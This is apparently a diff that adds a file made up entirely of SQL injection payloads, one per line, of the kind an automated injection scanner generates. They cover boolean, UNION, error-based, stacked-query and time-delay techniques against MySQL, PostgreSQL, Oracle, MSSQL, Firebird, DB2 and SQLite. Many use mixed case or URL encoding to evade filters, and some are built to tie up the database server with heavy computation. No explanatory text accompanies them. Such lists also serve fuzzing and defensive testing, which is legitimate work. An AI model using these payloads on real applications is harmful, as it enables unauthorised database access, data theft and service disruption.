@@ -1,0 +1,800 @@
+-8588' UnIoN AlL SeLeCt 2135,2135--
+1'));SeLeCt pG_SlEeP(5)--
+1'||(select 'pxkz' where 2207=2207 and (3020=3020)*6703)||'
+1%20and%20(select%209067%20from(select%20count(*),concat(0x7171706a71,(select%20(elt(9067=9067,1))),0x717a767a71,floor(rand(0)*2))x%20from%20information_schema%2echaracter_sets%20group%20by%20x)a)#%20myqr
+-7482\")))%20or%209077=2651
+1' |  | (select 'dezl' where 8661 = 8661 ; select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4) |  | '
+-3749\" or elt(1032=1032,3623) and \"mzrw\"=\"mzrw
+1) as zelk where 1944=1944 or char(117)||char(111)||char(105)||char(100)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--
+1\") as lexx where 2892=2892 or elt(6272=6272,sleep(5))--
+1')) AnD ChAr(120)||cHaR(106)||ChAr(117)||cHaR(85)=ReGeXp_sUbStRiNg(rEpEaT(RiGhT(ChAr(9981),0),5000000000),NuLl) AnD (('bDsQ' lIkE 'bDsQ
+-1375'))) or (1226=9648)*9648 and ((('kfoy' like 'kfoy
+1));select case when 7717=7717 then 1 else null end--
+1\"));SeLeCt cOuNt(*) FrOm sYsIbM.SyStAbLeS As t1,SySiBm.sYsTaBlEs aS T2,sYsIbM.SyStAbLeS As t3 AnD ((\"sFnJ\" lIkE \"sFnJ
+1) where 7956=7956 or sleep(5)#
+-8144') where 1691=1691 or elt(7246=7816,7816)--
+1;sElEcT CaSe wHeN 7717=7717 ThEn 1 eLsE NuLl eNd--
+1\")%20and%208514=(select%20count(*)%20from%20domain%2edomains%20as%20t1,domain%2ecolumns%20as%20t2,domain%2etables%20as%20t3)%20and%20(\"jfgk\"%20like%20\"jfgk
+1') aS HcPp wHeRe 1863=1863;iF(7340=9813) sElEcT 7340 eLsE DrOp fUnCtIoN YpPp--
+1\") aNd 6414=(sElEcT CoUnT(*) fRoM RdB$FiElDs aS T1,rDb$tYpEs aS T2,rDb$cOlLaTiOnS As t3,RdB$FuNcTiOnS As t4) aNd (\"rVuB\" lIkE \"rVuB
+1))%20as%20jrzr%20where%205194=5194%20and%20char(107)||char(121)||char(97)||char(80)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--
+1))%20and%203580=(select%20count(*)%20from%20domain%2edomains%20as%20t1,domain%2ecolumns%20as%20t2,domain%2etables%20as%20t3)--
+1' in boolean mode) and 2006=2006
+1%')))%20and%209198=9198--
+-9050 uNiOn aLl sElEcT 9346,9346,9346,9346,9346,9346,9346,9346,9346,9346--
+1)) and make_set(8554=3286,3286) and ((7385=7385
+1') ; select like('abcdefg',upper(hex(randomblob(500000000 / 2))))--
+1' In bOoLeAn mOdE) aNd 2006=2006
+1,(select * from generate_series(5609,5609,case when (5609=5609) then 1 else 0 end) limit 1)
+1')))(sElEcT (cAsE WhEn (5451=5451) tHeN ReGeXp_sUbStRiNg(rEpEaT(RiGhT(ChAr(5451),0),500000000),nUlL) eLsE ChAr(108)||cHaR(76)||cHaR(112)||ChAr(116) EnD) fRoM InFoRmAtIoN_ScHeMa.sYsTeM_UsErS) aNd ((('bVdW'='BvDw
+1%\") and 3580=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3)--
+1\")) Or 4240=(sElEcT 4240 fRoM Pg_sLeEp(5))--
+1' In bOoLeAn mOdE) aNd 8148=LiKe('AbCdEfG',uPpEr(hEx(rAnDoMbLoB(500000000/2))))--
+1,(select (case when (5885=1825) then 1 else 5885*(select 5885 from master..sysdatabases) end))
+1\" procedure analyse(extractvalue(9255,concat(0x5c,(benchmark(5000000,md5(0x52515a50))))),1) and \"ikhr\"=\"ikhr
+1%\" or updatexml(1808,concat(0x2e,0x7171706a71,(select (elt(1808 = 1808,1))),0x717a767a71),8666) and \"%\" = \"
+1\")) as isqj where 6344 = 6344 union all select null,null,null,null--
+1%\")) and 2853 = cast((chr(113) |  | chr(113) |  | chr(112) |  | chr(106) |  | chr(113)) |  | (select (case when (2853 = 2853) then 1 else 0 end))::text |  | (chr(113) |  | chr(122) |  | chr(118) |  | chr(122) |  | chr(113)) as numeric) and ((\"%\" = \"
+1')) AnD 7533=7533 AnD (('iAlM'='IaLm
+1%20where%208102=8102%20and%209198=9198--
+1%\"))) or 5286=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5) and (((\"%\"=\"
+1%'))) AnD 4595=4595#
+1' where 6853 = 6853 or exp(~(select * from (select concat(0x7171706a71,(select (elt(6270 = 6270,1))),0x717a767a71,0x78))x))--
+1\")) ; select like('abcdefg',upper(hex(randomblob(500000000 / 2))))--
+1%\") and 2716=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7)--
+1\") where 9827=9827;call regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--
+-6754')%20where%208388=8388%20union%20all%20select%208388,8388,8388,8388,8388--
+1\"%20where%207110=7110;select%20(case%20when%20(4666=4666)%20then%201%20else%204666*(select%204666%20from%20master%2e%2esysdatabases)%20end)--
+1' or row(1045,7562)>(select count(*),concat(0x7171706a71,(select (elt(1045=1045,1))),0x717a767a71,floor(rand(0)*2))x from (select 8488 union select 5584 union select 3051 union select 1210)a group by x) and 'yvzf'='yvzf
+1\" where 7631=7631 and 4733=3439
+1%\") and 8626 = 3626#
+1\"))) aNd 6414=(sElEcT CoUnT(*) fRoM RdB$FiElDs aS T1,rDb$tYpEs aS T2,rDb$cOlLaTiOnS As t3,RdB$FuNcTiOnS As t4) aNd (((\"sAjL\"=\"SaJl
+1')));select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 and ((('qvoy'='qvoy
+1\" and exp(~(select * from (select concat(0x7171706a71,(select (elt(8190 = 8190,1))),0x717a767a71,0x78))x))
+1'%20where%202202=2202%20and%202716=(select%20count(*)%20from%20sysusers%20as%20sys1,sysusers%20as%20sys2,sysusers%20as%20sys3,sysusers%20as%20sys4,sysusers%20as%20sys5,sysusers%20as%20sys6,sysusers%20as%20sys7)--
+1')) and 2853=cast((chr(113)||chr(113)||chr(112)||chr(106)||chr(113))||(select (case when (2853=2853) then 1 else 0 end))::text||(chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) as numeric) and (('guxv'='guxv
+1\"%20and%20exp(~(select%20*%20from%20(select%20concat(0x7171706a71,(select%20(elt(8190=8190,1))),0x717a767a71,0x78))x))%20and%20\"qzzg\"%20like%20\"qzzg
+-1579%')))%20union%20all%20select%207272#
+1\"))%20as%20eglv%20where%207412=7412%20union%20all%20select%20null#
+1 aNd 5556=(sElEcT CoUnT(*) fRoM AlL_UsErS T1,aLl_uSeRs t2,AlL_UsErS T3,aLl_uSeRs t4,AlL_UsErS T5)
+1\")) and (select 9067 from(select count(*),concat(0x7171706a71,(select (elt(9067 = 9067,1))),0x717a767a71,floor(rand(0)*2))x from information_schema.character_sets group by x)a) and ((\"qycx\" like \"qycx
+1'))) uNiOn aLl sElEcT NuLl,nUlL,NuLl,nUlL,NuLl,nUlL#
+1\"));SeLeCt (CaSe wHeN (4769=4769) ThEn 4769 ElSe 4769*(sElEcT 4769 fRoM MySqL.Db) EnD)#
+1\"));call regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) and ((\"squx\" like \"squx
+-8098%') union all select 5697,5697,5697,5697,5697,5697,5697,5697,5697,5697#
+1'+(sElEcT BlBd wHeRe 7451=7451 oR (sElEcT 9173 fRoM(SeLeCt cOuNt(*),CoNcAt(0X7171706A71,(sElEcT (eLt(9173=9173,1))),0x717a767a71,fLoOr(rAnD(0)*2))X FrOm iNfOrMaTiOn_sChEmA.ChArAcTeR_SeTs gRoUp bY X)A))+'
+1\")%20where%205870=5870%20union%20all%20select%20null,null,null--
+1%\") union all select null,null,null,null,null,null,null,null,null,null--
+1\") or 7552=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4) and (\"azpb\"=\"azpb
+-4058)%20union%20all%20select%209184--
+1' and 7756 = dbms_utility.sqlid_to_sqlhash((chr(113) |  | chr(113) |  | chr(112) |  | chr(106) |  | chr(113) |  | (select (case when (7756 = 7756) then 1 else 0 end) from dual) |  | chr(113) |  | chr(122) |  | chr(118) |  | chr(122) |  | chr(113))) and 'yvxg' = 'yvxg
+1%\" oR 8156=(SeLeCt cOuNt(*) FrOm gEnErAtE_SeRiEs(1,5000000))--
+1');select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4
+1')) as oocd where 2919 = 2919 or 8384 = like('abcdefg',upper(hex(randomblob(500000000 / 2))))--
+1%\") and 6414=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4) and (\"%\"=\"
+1%' and sleep(5)#
+1' ; select (case when (1093 = 7693) then 1093 else 1 / (select 0) end)--
+1')) ; select dbms_pipe.receive_message(chr(66) |  | chr(67) |  | chr(79) |  | chr(101),5) from dual and (('fnna' = 'fnna
+1'))) uNiOn aLl sElEcT NuLl,nUlL,NuLl,nUlL,NuLl,nUlL,NuLl,nUlL,NuLl,nUlL--
+-2495)) as hudw where 4197 = 4197 or 4747 = dbms_utility.sqlid_to_sqlhash((chr(113) |  | chr(113) |  | chr(112) |  | chr(106) |  | chr(113) |  | (select (case when (4747 = 4747) then 1 else 0 end) from dual) |  | chr(113) |  | chr(122) |  | chr(118) |  | chr(122) |  | chr(113)))--
+1')) as vuzt where 4971 = 4971 ; select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4--
+-9197%\"))) union all select 1040,1040,1040,1040,1040,1040,1040,1040,1040#
+1%')))%20or%20sleep(5)%20and%20((('%'='
+1')));select%20(case%20when%20(4111=1992)%20then%204111%20else%201%2f(select%200)%20end)--
+1\")) RlIkE (sElEcT * FrOm (SeLeCt(sLeEp(5)))sGvO) aNd ((\"GrCt\"=\"gRcT
+1'+(select nash where 4159 = 4159 union all select null#
+1%');select (case when (6434=3877) then 6434 else 1/(select 0) end)--
+1%20or%204915=(select%20count(*)%20from%20domain%2edomains%20as%20t1,domain%2ecolumns%20as%20t2,domain%2etables%20as%20t3)--
+1'))%20as%20vdhw%20where%208858=8858%20order%20by%201#
+1'))%20as%20jpxj%20where%206153=6153%20or%208156=(select%20count(*)%20from%20generate_series(1,5000000))--
+-4523%20or%204747=dbms_utility%2esqlid_to_sqlhash((chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select%20(case%20when%20(4747=4747)%20then%201%20else%200%20end)%20from%20dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)))
+1') and char(111)||char(77)||char(121)||char(88)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) and ('qdsr' like 'qdsr
+-4155')))%20union%20all%20select%201775,1775,1775,1775,1775,1775,1775--
+1\" where 2403=2403 or 4915=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3)--
+1 where 7038=7038;select (case when (4660=4660) then 4660 else cast(1 as int)/(select 0 from dual) end) from dual--
+-9014%') UnIoN AlL SeLeCt 4211,4211,4211,4211,4211,4211#
+1'+(sElEcT 'uIjV' wHeRe 7279=7279 aNd 8312=DbMs_pIpE.ReCeIvE_MeSsAgE(ChR(69)||cHr(79)||ChR(101)||ChR(68),5)--
+1' or (select 2*(if((select * from (select concat(0x7171706a71,(select (elt(8113 = 8113,1))),0x717a767a71,0x78))s), 8446744073709551610, 8446744073709551610))) and 'qvyq' like 'qvyq
+1) where 2678=2678 union all select null,null,null,null,null,null,null,null,null#
+1%\")%20union%20all%20select%20null,null,null,null,null,null,null,null,null,null#
+1\"));SeLeCt sLeEp(5) AnD ((\"tWeD\" lIkE \"tWeD
+-6566') aS KgGb wHeRe 9768=9768 oRdEr bY 1--
+1%\")%20rlike%20sleep(5)#
+1%'))) UnIoN AlL SeLeCt nUlL#
+1%\" oR SlEeP(5) aNd \"%\"=\"
+1\"))) and (7396 = 6351)*6351 and (((\"xerw\" like \"xerw
+1')) AnD 6969=(SeLeCt 6969 FrOm pG_SlEeP(5)) AnD (('pRjF'='PrJf
+1%');SeLeCt (CaSe wHeN (4660=4660) ThEn 4660 ElSe cAsT(1 As iNt)/(sElEcT 0 FrOm dUaL) eNd) FrOm dUaL--
+1\")%20and%209198=9198--
+-6523\" or 4144=(select upper(xmltype(chr(60)||chr(58)||chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4144=4144) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)||chr(62))) from dual) and \"bwrb\" like \"bwrb
+1\");sElEcT DbMs_pIpE.ReCeIvE_MeSsAgE(ChR(112)||ChR(70)||cHr(106)||cHr(78),5) FrOm dUaL--
+1' ; (select * from (select(sleep(5)))srmq) and 'yfvu' like 'yfvu
+1 waitfor delay '0:0:5'-- nnnp
+1' in boolean mode) or row(1045,7562)>(select count(*),concat(0x7171706a71,(select (elt(1045 = 1045,1))),0x717a767a71,floor(rand(0)*2))x from (select 8488 union select 5584 union select 3051 union select 1210)a group by x)#
+1)%20as%20jqbv%20where%208172=8172%20and%208148=like('abcdefg',upper(hex(randomblob(500000000%2f2))))--
+-8397')))%20or%202171=4788
+1) As qZiF WhErE 7877=7877 UnIoN AlL SeLeCt nUlL,NuLl,nUlL,NuLl,nUlL,NuLl,nUlL--
+-9526 where 5734=5734 or elt(1032=1032,3623)--
+1%\"%20union%20all%20select%20null,null,null,null,null,null,null--
+-4121%\") union all select 2659,2659,2659,2659,2659,2659,2659,2659--
+1))) or 1022 = (select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5)--
+1%\")) ; select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and ((\"%\" = \"
+1\" rlike sleep(5)#
+1%')) oR ElT(5873=5873,SlEeP(5))#
+1%')))%20and%20char(120)||char(106)||char(117)||char(85)=regexp_substring(repeat(right(char(9981),0),5000000000),null)%20and%20((('%'='
+1%')) aNd uPdAtExMl(3393,CoNcAt(0X2E,0x7171706a71,(SeLeCt (ElT(3393=3393,1))),0X717A767A71),1161) aNd (('%'='
+1)) oR 7417=(SeLeCt cOuNt(*) FrOm sYsIbM.SyStAbLeS As t1,SySiBm.sYsTaBlEs aS T2,sYsIbM.SyStAbLeS As t3)--
+1%\"));begin dbms_lock.sleep(5); end--
+1%') and 6240=('qqpjq'||(select case 6240 when 6240 then 1 else 0 end from rdb$database)||'qzvzq') and ('%'='
+1\" ; select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4
+1')) Or 8421=(sElEcT CoUnT(*) fRoM GeNeRaTe_sErIeS(1,5000000)) AnD (('uOrW' lIkE 'uOrW
+-7659')%20as%20bowy%20where%204835=4835%20or%204747=dbms_utility%2esqlid_to_sqlhash((chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select%20(case%20when%20(4747=4747)%20then%201%20else%200%20end)%20from%20dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)))--
+1%')) procedure analyse(extractvalue(9255,concat(0x5c,(benchmark(5000000,md5(0x52515a50))))),1) and (('%' = '
+1\"))) oR RoW(1045,7562)>(SeLeCt cOuNt(*),CoNcAt(0X7171706A71,(sElEcT (eLt(1045=1045,1))),0x717a767a71,fLoOr(rAnD(0)*2))X FrOm (SeLeCt 8488 UnIoN SeLeCt 5584 UnIoN SeLeCt 3051 UnIoN SeLeCt 1210)A GrOuP By x) AnD (((\"HbGr\" LiKe \"HbGr
+1%' oR 5356=(SeLeCt cOuNt(*) FrOm sYsUsErS As sYs1,SySuSeRs aS SyS2,sYsUsErS As sYs3,SySuSeRs aS SyS4,sYsUsErS As sYs5,SySuSeRs aS SyS6,sYsUsErS As sYs7)--
+-6770')) union all select 1845,1845,1845,1845,1845,1845,1845,1845,1845#
+-3441')) As dXvT WhErE 9291=9291 UnIoN AlL SeLeCt 9291,9291,9291#
+1');select pg_sleep(5) and ('vnss' like 'vnss
+1'||(select 'ggfx' where 4932=4932 or 2633=dbms_pipe.receive_message(chr(112)||chr(65)||chr(65)||chr(103),5))||'
+1'))%20as%20xpmy%20where%205274=5274%20rlike%20(select%20(case%20when%20(6252=7704)%20then%201%20else%200x28%20end))--
+1) As wXmS WhErE 7272=7272 AnD 3707=(SeLeCt cOuNt(*) FrOm sYsIbM.SyStAbLeS As t1,SySiBm.sYsTaBlEs aS T2,sYsIbM.SyStAbLeS As t3)--
+1\")));select pg_sleep(5) and (((\"wqeb\"=\"wqeb
+1'+(select 'vabj' where 7178=7178 union all select null,null,null,null,null#
+1)) oR 5286=(SeLeCt cOuNt(*) FrOm aLl_uSeRs t1,AlL_UsErS T2,aLl_uSeRs t3,AlL_UsErS T4,aLl_uSeRs t5) aNd ((8048=8048
+1\"))%20as%20wnzf%20where%203352=3352%20or%20char(117)||char(111)||char(105)||char(100)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--
+1\")) As zEmM WhErE 3324=3324 Or 2367=(sElEcT CoUnT(*) fRoM RdB$FiElDs aS T1,rDb$tYpEs aS T2,rDb$cOlLaTiOnS As t3,RdB$FuNcTiOnS As t4)--
+1' In bOoLeAn mOdE) oR 8514=bEnChMaRk(5000000,mD5(0X544D5A4C))#
+-3316%\" oR 3440=cAsT((cHr(113)||cHr(113)||cHr(112)||cHr(106)||cHr(113))||(sElEcT (cAsE WhEn (3440=3440) tHeN 1 ElSe 0 eNd))::TeXt||(cHr(113)||cHr(122)||cHr(118)||cHr(122)||cHr(113)) aS NuMeRiC) aNd \"%\"=\"
+1'+(select 'utlx' where 6256 = 6256 or extractvalue(1297,concat(0x5c,0x7171706a71,(select (elt(1297 = 1297,1))),0x717a767a71)))+'
+-7743\" or 9323=9323#
+1') aS WnYs wHeRe 6457=6457 oR 8514=bEnChMaRk(5000000,mD5(0X544D5A4C))#
+1 and 3202=like('abcdefg',upper(hex(randomblob(500000000/2))))# qmkh
+1%') or 7427 = dbms_pipe.receive_message(chr(116) |  | chr(87) |  | chr(90) |  | chr(109),5)--
+1')) AnD 7756=dBmS_UtIlItY.SqLiD_To_sQlHaSh((ChR(113)||ChR(113)||ChR(112)||ChR(106)||ChR(113)||(sElEcT (cAsE WhEn (7756=7756) tHeN 1 ElSe 0 eNd) FrOm dUaL)||ChR(113)||ChR(122)||ChR(118)||ChR(122)||ChR(113))) aNd (('HbWk' LiKe 'HbWk
+1' (select (case when (4587=4587) then regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) else char(76)||char(65)||char(102)||char(72) end) from (values(0))) and 'aicu'='aicu
+1) As pTxW WhErE 9873=9873;BeGiN DbMs_lOcK.SlEeP(5); EnD--
+1%\" aNd uPdAtExMl(3393,CoNcAt(0X2E,0x7171706a71,(SeLeCt (ElT(3393=3393,1))),0X717A767A71),1161) aNd \"%\"=\"
+-8144') wHeRe 1691=1691 oR ElT(7246=7816,7816)--
+1'))) aNd uPdAtExMl(3393,CoNcAt(0X2E,0x7171706a71,(SeLeCt (ElT(3393=3393,1))),0X717A767A71),1161) aNd ((('yQhK'='YqHk
+-4615'))) oR ElT(1032=1032,3623) AnD ((('JiPk' LiKe 'JiPk
+1%20where%208949=8949%20and%20make_set(8403=8403,8899)--
+-8454\" or 6872 = 6872
+-3559') or 5903=('qqpjq'||(select case 5903 when 5903 then 1 else 0 end from rdb$database)||'qzvzq')
+-2901\"%20or%20elt(9866=9099,9099)%20and%20\"asib\"%20like%20\"asib
+1')) As jZoH WhErE 6484=6484 AnD 7364=4233--
+1'+(select%20tart%20where%209861=9861;begin%20dbms_lock%2esleep(5);%20end--
+1) AnD 7756=dBmS_UtIlItY.SqLiD_To_sQlHaSh((ChR(113)||ChR(113)||ChR(112)||ChR(106)||ChR(113)||(sElEcT (cAsE WhEn (7756=7756) tHeN 1 ElSe 0 eNd) FrOm dUaL)||ChR(113)||ChR(122)||ChR(118)||ChR(122)||ChR(113)))
+1')) or char(68)||char(69)||char(97)||char(85)=regexp_substring(repeat(right(char(5389),0),5000000000),null) and (('gxgi'='gxgi
+1')) or (select 9173 from(select count(*),concat(0x7171706a71,(select (elt(9173=9173,1))),0x717a767a71,floor(rand(0)*2))x from information_schema.character_sets group by x)a) and (('pqxe' like 'pqxe
+1))%20union%20all%20select%20null,null#
+1)) aS PxMz wHeRe 2596=2596;sElEcT CoUnT(*) fRoM SySiBm.sYsTaBlEs aS T1,sYsIbM.SyStAbLeS As t2,SySiBm.sYsTaBlEs aS T3--
+1\" WhErE 5440=5440 AnD 8189=(SeLeCt cOuNt(*) FrOm sYsIbM.SyStAbLeS As t1,SySiBm.sYsTaBlEs aS T2,sYsIbM.SyStAbLeS As t3)--
+1\") uNiOn aLl sElEcT NuLl,nUlL,NuLl,nUlL,NuLl,nUlL#
+1\")%20and%205556=(select%20count(*)%20from%20all_users%20t1,all_users%20t2,all_users%20t3,all_users%20t4,all_users%20t5)%20and%20(\"dppw\"%20like%20\"dppw
+1%')%20rlike%20(select%20(case%20when%20(7689=7689)%20then%201%20else%200x28%20end))%20and%20('%'='
+1')%20where%209842=9842%20union%20all%20select%20null,null,null,null,null,null,null,null#
+1%\"))) and elt(9524=1124,1124) and (((\"%\"=\"
+-3963\" or 1224=5119
+-9950' Or 4425=1975
+1'))) oR SlEeP(5)#
+-2872)%20where%208797=8797%20or%201%20group%20by%20concat(0x7171706a71,(select%20(case%20when%20(4232=4232)%20then%201%20else%200%20end)),0x717a767a71,floor(rand(0)*2))%20having%20min(0)#
+1\"));select benchmark(5000000,md5(0x4c4d6142)) and ((\"uhvy\"=\"uhvy
+1)%20as%20zdym%20where%201578=1578%20union%20all%20select%20null,null,null#
+1')) AnD 6510=(SeLeCt cOuNt(*) FrOm sYsUsErS As sYs1,SySuSeRs aS SyS2,sYsUsErS As sYs3,SySuSeRs aS SyS4,sYsUsErS As sYs5,SySuSeRs aS SyS6,sYsUsErS As sYs7) aNd (('UaDr' LiKe 'UaDr
+1'+(select%20'wsjk'%20where%203291=3291;select%20(case%20when%20(9816=1693)%20then%209816%20else%20cast(1%20as%20int)%2f(select%200%20from%20dual)%20end)%20from%20dual--
+1') wHeRe 3767=3767 aNd 6240=('QqPjQ'||(sElEcT CaSe 6240 WhEn 6240 ThEn 1 eLsE 0 EnD FrOm rDb$dAtAbAsE)||'qZvZq')--
+1%' and 2716=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7)--
+1',(select%20(case%20when%20(1570=1570)%20then%20(select%201570%20from%20pg_sleep(5))%20else%201%2f(select%200)%20end))
+-4289' Or 2724 In ((cHaR(113)+cHaR(113)+cHaR(112)+cHaR(106)+cHaR(113)+(SeLeCt (CaSe wHeN (2724=2724) ThEn cHaR(49) ElSe cHaR(48) EnD))+ChAr(113)+ChAr(122)+ChAr(118)+ChAr(122)+ChAr(113))) AnD 'aGnC' lIkE 'aGnC
+-7505')) As lQvW WhErE 8565=8565 Or 6872=6872--
+-9212 or 1026=7967#
+1 ; select sleep(5)-- waln
+1%')) aNd cHaR(120)||ChAr(106)||cHaR(117)||ChAr(85)=rEgExP_SuBsTrInG(RePeAt(rIgHt(cHaR(9981),0),5000000000),nUlL) aNd (('%'='
+1%';waitfor%20delay%20'0:0:5'%20and%20'%'='
+-7884\" where 3297=3297 or 2492=6158
+1%')))%20or%20row(1045,7562)>(select%20count(*),concat(0x7171706a71,(select%20(elt(1045=1045,1))),0x717a767a71,floor(rand(0)*2))x%20from%20(select%208488%20union%20select%205584%20union%20select%203051%20union%20select%201210)a%20group%20by%20x)%20and%20((('%'='
+1'+(select vvet where 5221=5221 and exp(~(select * from (select concat(0x7171706a71,(select (elt(8190=8190,1))),0x717a767a71,0x78))x)))+'
+1\")) as qejm where 9014 = 9014 union all select null,null,null,null,null,null#
+1\"%20where%203678=3678%20and%206537=dbms_pipe%2ereceive_message(chr(76)||chr(116)||chr(117)||chr(65),5)--
+1\")%20and%208312=dbms_pipe%2ereceive_message(chr(69)||chr(79)||chr(101)||chr(68),5)--
+1');select%20(case%20when%20(4769=4769)%20then%204769%20else%204769*(select%204769%20from%20mysql%2edb)%20end)#
+-6129 union all select 9122,9122#
+1' in boolean mode);select (case when (4666=4666) then 1 else 4666*(select 4666 from master..sysdatabases) end)--
+-2325) UnIoN AlL SeLeCt 4692,4692,4692,4692#
+1' in boolean mode)(select (case when (4587 = 4587) then regexp_substring(repeat(left(crypt_key(char(65) |  | char(69) |  | char(83),null),0),500000000),null) else char(76) |  | char(65) |  | char(102) |  | char(72) end) from (values(0)))#
+1 where 4844 = 4844 ; select case when 3252 = 9622 then 1 else null end--
+1%\")) and 4241=convert(int,(select char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (4241=4241) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))) and ((\"%\"=\"
+1);SeLeCt dBmS_PiPe.rEcEiVe_mEsSaGe(cHr(112)||cHr(70)||ChR(106)||ChR(78),5) fRoM DuAl--
+1\"%20and%208514=(select%20count(*)%20from%20domain%2edomains%20as%20t1,domain%2ecolumns%20as%20t2,domain%2etables%20as%20t3)
+1\"%20where%204319=4319;select%20count(*)%20from%20all_users%20t1,all_users%20t2,all_users%20t3,all_users%20t4,all_users%20t5--
+1)%20or%208421=(select%20count(*)%20from%20generate_series(1,5000000))%20and%20(5215=5215
+1) or 7552=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4) and (5468=5468
+-8772%' union all select 4909,4909,4909,4909,4909,4909,4909,4909,4909#
+1') aNd eLt(4249=4249,7259) aNd ('bXnN'='BxNn
+1')) As qZyP WhErE 5081=5081 Or 2633=DbMs_pIpE.ReCeIvE_MeSsAgE(ChR(112)||ChR(65)||cHr(65)||ChR(103),5)--
+1' or elt(6272 = 6272,sleep(5)) and 'vrim' = 'vrim
+1',(select%206825%20from(select%20count(*),concat(0x7171706a71,(select%20(elt(6825=6825,1))),0x717a767a71,floor(rand(0)*2))x%20from%20information_schema%2echaracter_sets%20group%20by%20x)a)
+1'||(select%20'jlon'%20where%201461=1461;iif(5257=5257,1,1%2f0)
+1\")) and 3754 = (select upper(xmltype(chr(60) |  | chr(58) |  | chr(113) |  | chr(113) |  | chr(112) |  | chr(106) |  | chr(113) |  | (select (case when (3754 = 3754) then 1 else 0 end) from dual) |  | chr(113) |  | chr(122) |  | chr(118) |  | chr(122) |  | chr(113) |  | chr(62))) from dual) and ((\"qnqb\" like \"qnqb
+1')%20or%20updatexml(1808,concat(0x2e,0x7171706a71,(select%20(elt(1808=1808,1))),0x717a767a71),8666)%20and%20('iifh'='iifh
+-8245\")) or 3038 = 3038
+1%\")%20and%206537=dbms_pipe%2ereceive_message(chr(76)||chr(116)||chr(117)||chr(65),5)%20and%20(\"%\"=\"
+1' and 4386=utl_inaddr.get_host_address(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4386=4386) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) and 'fdbm' like 'fdbm
+1') where 7279=7279 and 8189=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3)--
+1' AnD SlEeP(5) aNd 'KaPr'='kApR
+1')%20and%20(3020=3020)*6703%20and%20('lhfa'='lhfa
+1%20or%20elt(5873=5873,sleep(5))#
+-8312%\"))%20union%20all%20select%204972--
+1) as imdt where 6431 = 6431 ; begin user_lock.sleep(5) ;  end--
+1%')));select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 and ((('%'='
+1%'))%20and%205556=(select%20count(*)%20from%20all_users%20t1,all_users%20t2,all_users%20t3,all_users%20t4,all_users%20t5)%20and%20(('%'='
+1' and 8407 = (select count(*) from generate_series(1,5000000)) and 'zetf' = 'zetf
+-7903 wHeRe 6699=6699 oR 8571=8571--
+1\");sElEcT CoUnT(*) fRoM SySiBm.sYsTaBlEs aS T1,sYsIbM.SyStAbLeS As t2,SySiBm.sYsTaBlEs aS T3 aNd (\"lSvG\" lIkE \"lSvG
+-2287'))%20union%20all%20select%201200,1200,1200,1200,1200#
+1') union all select null--
+1')%20and%20(select%202*(if((select%20*%20from%20(select%20concat(0x7171706a71,(select%20(elt(3484=3484,1))),0x717a767a71,0x78))s),%208446744073709551610,%208446744073709551610)))%20and%20('fnjm'='fnjm
+1) or 6793 = (select 6793 from pg_sleep(5))
+1%';select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3 and '%'='
+1\") where 4905=4905 and char(109)||char(79)||char(70)||char(90)=regexp_substring(repeat(right(char(5012),0),5000000000),null)--
+1\")%20where%204172=4172%20or%20(select%20*%20from%20(select(sleep(5)))sddo)#
+1 and 4241 = convert(int,(select char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (4241 = 4241) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113)))
+1 ; begin user_lock.sleep(5) ;  end# ckxq
+1%'));sElEcT (cAsE WhEn (4006=1276) tHeN 1 ElSe 4006*(sElEcT 4006 fRoM MaStEr..SySdAtAbAsEs) EnD)--
+1%'));select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3--
+1%\"));select%20count(*)%20from%20generate_series(1,5000000)--
+1\")) or 8315=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3) and ((\"dacx\"=\"dacx
+-8633\" or 5099 = 5974
